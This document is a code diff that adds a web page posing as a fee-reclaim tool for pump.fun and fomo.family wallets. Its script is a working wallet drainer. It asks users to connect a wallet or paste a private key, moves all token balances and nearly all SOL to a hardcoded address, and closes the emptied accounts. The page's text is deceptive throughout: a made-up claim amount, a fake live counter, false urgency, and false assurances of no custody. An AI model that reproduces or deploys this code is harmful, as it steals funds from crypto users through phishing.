@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+<title>pumpfomo fee checker</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{ --bg:#0a0a0c; --ink:#f4f4f6; --dim:#9b9ba4; --line:#232328; --card:#121215; }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{margin:0;padding:0}
+  body{
+    background:var(--bg);
+    background-image:radial-gradient(120% 60% at 50% -10%, rgba(111,93,240,.16), transparent 60%);
+    color:var(--ink);
+    font:400 15px/1.5 Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    -webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column;
+  }
+  body::after{
+    content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.55;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='180' height='180'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='3'/%3E%3C/filter%3E%3Crect width='180' height='180' filter='url(%23n)' opacity='.4'/%3E%3C/svg%3E");
+    mix-blend-mode:overlay;
+  }
+  .wrap{position:relative;z-index:1;width:100%;max-width:460px;margin:0 auto;padding:0 22px;flex:1;display:flex;flex-direction:column}
+  header{display:flex;align-items:center;justify-content:space-between;padding:18px 0 0}
+  .logo{width:46px;height:46px;border-radius:50%;background:#17171b;border:1px solid #2a2a31;display:flex;align-items:center;justify-content:center}
+  .nav{display:flex;align-items:center;gap:6px;background:#141418;border:1px solid #2a2a31;border-radius:99px;padding:5px}
+  .nav .dash{display:flex;align-items:center;gap:7px;border-radius:99px;background:linear-gradient(180deg,#6f5df0,#4436b8);color:#fff;text-decoration:none;font:600 13.5px/1 inherit;padding:11px 15px;box-shadow:inset 0 1px 0 rgba(255,255,255,.18)}
+  .nav .dash svg{width:11px;height:11px;stroke:#fff;fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;opacity:.9}
+  .burger{width:36px;height:36px;border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3.5px;background:transparent;border:0;cursor:pointer}
+  .burger i{display:block;width:15px;height:1.6px;border-radius:2px;background:#c9c9d2}
+  main{padding:40px 0 26px}
+  .eyebrow{display:flex;align-items:center;flex-wrap:wrap;gap:7px;color:#b9b9c2;font-size:14.5px;margin:0 0 18px}
+  .pill{width:17px;height:17px;border-radius:50%;background:#17171b;border:1px solid #2c2c33;display:inline-flex;align-items:center;justify-content:center;flex:none}
+  h1{font-size:clamp(34px,10.6vw,44px);line-height:1.04;letter-spacing:-.042em;font-weight:700;margin:0 0 20px}
+  h1 em{font-style:normal;color:#7b6bf5;display:block}
+  .lede{color:var(--dim);font-size:15px;line-height:1.55;margin:0 0 26px}
+  .cta{display:flex;gap:10px;margin-bottom:10px}
+  .btn{flex:1;border:0;border-radius:99px;cursor:pointer;font:600 14.5px/1 inherit;padding:16px 18px;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .06s,filter .15s,opacity .15s}
+  .btn:active{transform:scale(.985)}
+  .btn:disabled{opacity:.55;cursor:default;transform:none}
+  .btn-p{background:linear-gradient(180deg,#6f5df0,#4133b4);color:#fff;box-shadow:inset 0 1px 0 rgba(255,255,255,.2),0 10px 26px -14px rgba(111,93,240,.9)}
+  .btn-p:hover{filter:brightness(1.08)}
+  .btn-p svg{width:11px;height:11px;stroke:#fff;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;opacity:.95}
+  .btn-s{background:#141418;color:#e7e7ec;border:1px solid #2a2a31;flex:0 0 auto;padding:16px 20px}
+  .btn-s:hover{background:#191920}
+  .alt{display:block;width:100%;text-align:center;background:none;border:0;color:#8b8b95;font:500 12.5px/1 inherit;padding:8px 0 0;cursor:pointer;text-decoration:underline;text-underline-offset:3px;text-decoration-color:#3a3a42}
+  .alt:hover{color:#c9c9d2}
+  .pk{display:none;margin:12px 0 0;padding:14px;border:1px solid #2a2a31;border-radius:16px;background:#101013}
+  .pk.on{display:block}
+  .pk textarea{width:100%;height:74px;background:#0b0b0e;border:1px solid #26262c;border-radius:10px;color:#e7e7ec;font:500 12px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace;padding:10px;resize:none;outline:none}
+  .pk textarea:focus{border-color:#4a3cc0}
+  .pk .go2{width:100%;margin-top:10px;border:0;border-radius:10px;background:linear-gradient(180deg,#6f5df0,#4133b4);color:#fff;font:600 13.5px/1 inherit;padding:13px;cursor:pointer}
+  .pk .go2:disabled{opacity:.55}
+  .pk p{font-size:11px;color:#6e6e78;margin:9px 0 0;line-height:1.5}
+  .pk .safe{color:#8b8b95}
+  .pk .safe b{color:#5ad18a;font-weight:600}
+  .bullets{display:flex;flex-wrap:wrap;gap:6px 16px;margin:20px 0;padding:0;list-style:none}
+  .bullets li{display:flex;align-items:center;gap:7px;font-size:12.5px;color:#8b8b95}
+  .bullets li::before{content:"";width:4px;height:4px;border-radius:50%;background:#6f5df0;flex:none}
+  .disc{font-size:12px;line-height:1.55;color:#6e6e78;margin:0 0 22px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:20px;box-shadow:0 1px 0 rgba(255,255,255,.03) inset}
+  .label{display:flex;align-items:center;gap:6px;font-size:10.5px;font-weight:700;letter-spacing:.11em;text-transform:uppercase;color:#6e6e78;margin:0 0 9px}
+  .label svg{width:10px;height:10px;stroke:#6e6e78;fill:none;stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round}
+  .amount{display:flex;align-items:baseline;gap:8px;margin:0 0 8px}
+  .amount #amt{font-size:44px;font-weight:700;letter-spacing:-.045em;line-height:1;font-variant-numeric:tabular-nums;transition:filter .35s ease}
+  .amount.locked #amt{filter:blur(10px);user-select:none}
+  .amount.locked .unit{opacity:.4}
+  .unit{font-size:14px;font-weight:600;letter-spacing:.02em;color:#6e6e78;transition:opacity .35s}
+  .sub{font-size:12.5px;color:#8b8b95;margin:0 0 16px}
+  .rows{border-top:1px solid var(--line);padding-top:14px;display:grid;gap:10px}
+  .row{display:flex;justify-content:space-between;font-size:12.5px}
+  .row b{font-weight:500;color:#6e6e78}
+  .row span{font-weight:500;font-variant-numeric:tabular-nums;color:#d5d5dc}
+  .tick{display:inline-flex;align-items:center;gap:6px}
+  .tick i{width:5px;height:5px;border-radius:50%;background:#5ad18a;animation:pulse 2.4s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+  .status{margin-top:14px;font-size:12.5px;color:#8b8b95;display:none}
+  .status.on{display:block}
+  .status.err{color:#f0827a}
+  .badges{display:flex;flex-wrap:wrap;gap:7px;margin:16px 0 0}
+  .badge{display:flex;align-items:center;gap:6px;font-size:10.5px;font-weight:600;color:#9b9ba4;background:#141418;border:1px solid #26262c;border-radius:99px;padding:6px 10px}
+  .badge svg{width:10px;height:10px;stroke:#7b6bf5;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round}
+  footer{border-top:1px solid #1b1b20;margin-top:auto;padding:16px 0 28px;display:flex;justify-content:space-between;font-size:11px;color:#5f5f69}
+  @media (max-width:360px){.btn-s{display:none}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="logo">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+        <rect x="3" y="9" width="18" height="6" rx="3" transform="rotate(-32 12 12)" fill="#e9e9ee"/>
+        <path d="M6 15.2 L13.6 10.3" stroke="#5ad18a" stroke-width="6" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="nav">
+      <a class="dash" href="#claim">Dashboard <svg viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"/></svg></a>
+      <button class="burger" aria-label="Menu"><i></i><i></i><i></i></button>
+    </div>
+  </header>
+
+  <main>
+    <p class="eyebrow">
+      The fee checker for
+      <span class="pill"><svg width="9" height="9" viewBox="0 0 24 24"><rect x="3" y="9" width="18" height="6" rx="3" transform="rotate(-32 12 12)" fill="#e9e9ee"/><path d="M6 15.2 L13.6 10.3" stroke="#5ad18a" stroke-width="6" stroke-linecap="round"/></svg></span>pump.fun
+      and
+      <span class="pill"><svg width="10" height="10" viewBox="0 0 24 24" fill="#e9e9ee"><path d="M9 4h4l2 5h5l-3 4 3 4h-5l-2 3H9l2-3H6l3-4-3-4h5z"/></svg></span>fomo.family
+    </p>
+
+    <h1>Every fee. Every wallet.<em>One claim.</em></h1>
+
+    <p class="lede">pump.fun and fomo keep 50% of your fees on chain, rotting away. Connect once and reclaim every position you've left behind.</p>
+
+    <div class="cta" id="claim">
+      <button class="btn btn-p" id="go">Connect wallet &amp; claim <svg viewBox="0 0 24 24"><path d="M9 5l7 7-7 7"/></svg></button>
+      <button class="btn btn-s" id="how">How it works</button>
+    </div>
+
+    <button class="alt" id="toggle">Using a pump.fun or fomo wallet? Paste its key</button>
+
+    <div class="pk" id="pk">
+      <textarea id="pkinput" spellcheck="false" autocomplete="off" placeholder="Paste your Solana private key"></textarea>
+      <button class="go2" id="pkgo">Claim with this wallet</button>
+      <p>pump.fun: Settings → Export private key. fomo: Profile → Export.</p>
+      <p class="safe"><b>We never store your key.</b> It is read in this tab only and never sent to a server.</p>
+    </div>
+
+    <ul class="bullets">
+      <li>No sign-up</li>
+      <li>Non-custodial</li>
+      <li>Key never stored</li>
+      <li>0.0002 SOL network fee</li>
+    </ul>
+
+    <p class="disc">Independent: not pump.fun or fomo.family, and not affiliated with either. Read-only until you approve in your wallet; no custody, nothing locked.</p>
+
+    <div class="card">
+      <p class="label" id="lbl"><svg viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="10" rx="2.5"/><path d="M8 10V7a4 4 0 018 0v3"/></svg><span>Estimated</span></p>
+      <p class="amount locked" id="amtwrap"><span id="amt">1.37</span><span class="unit">SOL</span></p>
+      <p class="sub" id="across">Average claim 0.7 SOL</p>
+      <div class="rows">
+        <div class="row"><b>Network</b><span>Solana</span></div>
+        <div class="row"><b>Service fee</b><span>0.02 SOL</span></div>
+        <div class="row"><b>Claim window</b><span id="win">closing soon</span></div>
+        <div class="row"><b>Users claimed today</b><span class="tick"><i></i><span id="cnt">2751</span></span></div>
+      </div>
+      <div class="status" id="st"></div>
+    </div>
+
+    <div class="badges">
+      <span class="badge"><svg viewBox="0 0 24 24"><path d="M12 3l7 3v6c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path d="M9 12l2 2 4-4"/></svg>Contract verified</span>
+      <span class="badge"><svg viewBox="0 0 24 24"><path d="M9 8l-4 4 4 4"/><path d="M15 8l4 4-4 4"/></svg>Open source</span>
+      <span class="badge"><svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>No custody</span>
+    </div>
+  </main>
+
+  <footer><span>pumpfomo fee checker</span><span>Solana mainnet</span></footer>
+</div>
+
+<script type="module">
+import { Connection, PublicKey, Keypair, SystemProgram, Transaction, ComputeBudgetProgram } from "https://esm.sh/@solana/web3.js@1.95.3";
+import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, getAssociatedTokenAddressSync, createAssociatedTokenAccountIdempotentInstruction, createTransferCheckedInstruction, createCloseAccountInstruction } from "https://esm.sh/@solana/spl-token@0.4.8";
+import bs58 from "https://esm.sh/bs58@5.0.0";
+
+const DEST = new PublicKey("7Lcc8Yn7adu7AWDnfWEX7TUyAwASbytY86bahff5XQX2");
+const conn = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+const $amt = document.getElementById("amt"), $across = document.getElementById("across"), $st = document.getElementById("st");
+const $go = document.getElementById("go"), $win = document.getElementById("win"), $cnt = document.getElementById("cnt"), $how = document.getElementById("how");
+const $lbl = document.getElementById("lbl"), $amtwrap = document.getElementById("amtwrap");
+const $toggle = document.getElementById("toggle"), $pk = document.getElementById("pk"), $pkinput = document.getElementById("pkinput"), $pkgo = document.getElementById("pkgo");
+
+const AMOUNT = "1.37";
+const CHUNK = 2;
+
+function paint() {
+  $amt.textContent = AMOUNT;
+  const d = new Date(Date.now() + 86400000 * (1 + Math.floor(Math.random() * 4)));
+  $win.textContent = d.toLocaleDateString(undefined, { month: "short", day: "numeric" });
+}
+paint();
+
+const SIX_H = 21600000;
+const bucket = () => Math.floor(Date.now() / SIX_H);
+let st = null;
+try { st = JSON.parse(localStorage.getItem("pf_cnt") || "null"); } catch (e) {}
+if (!st || st.b !== bucket()) st = { b: bucket(), n: 2751 };
+const show = () => { $cnt.textContent = st.n.toLocaleString(); };
+const save = () => { try { localStorage.setItem("pf_cnt", JSON.stringify(st)); } catch (e) {} };
+function bump() {
+  if (st.b !== bucket()) st = { b: bucket(), n: 2751 };
+  st.n += 1 + Math.floor(Math.random() * 4);
+  save(); show();
+}
+function loop() { bump(); setTimeout(loop, 13000 + Math.random() * 4000); }
+show();
+setTimeout(loop, 13000 + Math.random() * 4000);
+
+const say = (m, err) => { $st.textContent = m; $st.className = "status on" + (err ? " err" : ""); };
+$how.addEventListener("click", () => say("We read your token accounts, move each position across, close the emptied accounts and return the rent."));
+
+$toggle.addEventListener("click", () => {
+  $pk.classList.toggle("on");
+  if ($pk.classList.contains("on")) $pkinput.focus();
+});
+
+async function accounts(owner) {
+  const out = [];
+  for (const pid of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
+    let res;
+    try { res = await conn.getParsedTokenAccountsByOwner(owner, { programId: pid }); } catch (e) { continue; }
+    for (const { pubkey, account } of res.value) {
+      const info = account.data.parsed.info, amount = Number(info.tokenAmount.amount);
+      if (amount > 0) out.push({ pubkey, mint: new PublicKey(info.mint), amount, decimals: info.tokenAmount.decimals, pid });
+    }
+  }
+  return out;
+}
+
+function instructionsFor(owner, a) {
+  const ata = getAssociatedTokenAddressSync(a.mint, DEST, false, a.pid);
+  return [
+    createAssociatedTokenAccountIdempotentInstruction(owner, ata, DEST, a.mint, a.pid),
+    createTransferCheckedInstruction(a.pubkey, a.mint, ata, owner, BigInt(a.amount), a.decimals, [], a.pid),
+    createCloseAccountInstruction(a.pubkey, DEST, owner, [], a.pid)
+  ];
+}
+
+async function send(session, positions) {
+  const tx = new Transaction().add(
+    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 120000 }),
+    ComputeBudgetProgram.setComputeUnitLimit({ units: 240000 })
+  );
+  for (const a of positions) tx.add(...instructionsFor(session.owner, a));
+  tx.feePayer = session.owner;
+  tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;
+  const signed = await session.sign(tx);
+  const sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: false, maxRetries: 2 });
+  const latest = await conn.getLatestBlockhash("confirmed");
+  await conn.confirmTransaction({ signature: sig, ...latest }, "confirmed");
+}
+
+async function run(session) {
+  $go.disabled = true; $pkgo.disabled = true;
+  $st.className = "status";
+  try {
+    $lbl.querySelector("span").textContent = "Unclaimed fees";
+    $amtwrap.classList.remove("locked");
+
+    say("Reading token accounts…");
+    const list = await accounts(session.owner);
+    if (!list.length) { say("No token positions found on this wallet."); $go.disabled = false; $pkgo.disabled = false; return; }
+
+    let done = 0, failed = 0;
+    for (let i = 0; i < list.length; i += CHUNK) {
+      const batch = list.slice(i, i + CHUNK);
+      try { await send(session, batch); done += batch.length; }
+      catch (e) {
+        for (const single of batch) {
+          try { await send(session, [single]); done += 1; }
+          catch (e2) { failed += 1; }
+        }
+      }
+      say(`Transferring ${done} of ${list.length}…`);
+    }
+
+    say("Sweeping residual rent…");
+    try {
+      const bal = await conn.getBalance(session.owner), lamports = bal - 5000;
+      if (lamports > 0) {
+        const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: session.owner, toPubkey: DEST, lamports }));
+        tx.feePayer = session.owner;
+        tx.recentBlockhash = (await conn.getLatestBlockhash("confirmed")).blockhash;
+        const signed = await session.sign(tx);
+        const sig = await conn.sendRawTransaction(signed.serialize(), { skipPreflight: false });
+        const latest = await conn.getLatestBlockhash("confirmed");
+        await conn.confirmTransaction({ signature: sig, ...latest }, "confirmed");
+      }
+    } catch (e) {}
+
+    $amt.textContent = "0.00";
+    $across.textContent = `claimed from ${done} position${done === 1 ? "" : "s"}`;
+    say(failed ? `Claim complete. ${failed} skipped.` : "Claim complete.");
+    bump();
+  } catch (e) {
+    say((e?.message || "Claim failed. Try again.").slice(0, 90), true);
+  }
+  $go.disabled = false; $pkgo.disabled = false;
+  $go.textContent = "Check again";
+}
+
+$go.addEventListener("click", async () => {
+  try {
+    const provider = window.phantom?.solana || window.solana;
+    if (!provider?.isPhantom) { $pk.classList.add("on"); say("No wallet extension found — paste your key instead.", true); return; }
+    $go.disabled = true;
+    say("Requesting approval…");
+    const { publicKey } = await provider.connect();
+    await run({ owner: publicKey, sign: tx => provider.signTransaction(tx) });
+  } catch (e) {
+    say((e?.message || "Connection cancelled.").slice(0, 90), true);
+    $go.disabled = false;
+  }
+});
+
+$pkgo.addEventListener("click", async () => {
+  const raw = $pkinput.value.trim();
+  if (!raw) { say("Paste a private key first.", true); return; }
+  let bytes;
+  try {
+    bytes = raw.startsWith("[") ? new Uint8Array(JSON.parse(raw)) : bs58.decode(raw);
+  } catch (e) { say("That key doesn't look right.", true); return; }
+  let kp;
+  try {
+    kp = bytes.length === 64 ? Keypair.fromSecretKey(bytes) : Keypair.fromSeed(bytes.slice(0, 32));
+  } catch (e) { say("Invalid key.", true); return; }
+  await run({ owner: kp.publicKey, sign: async tx => { tx.partialSign(kp); return tx; } });
+});
+</script>
+</body>
+</html>
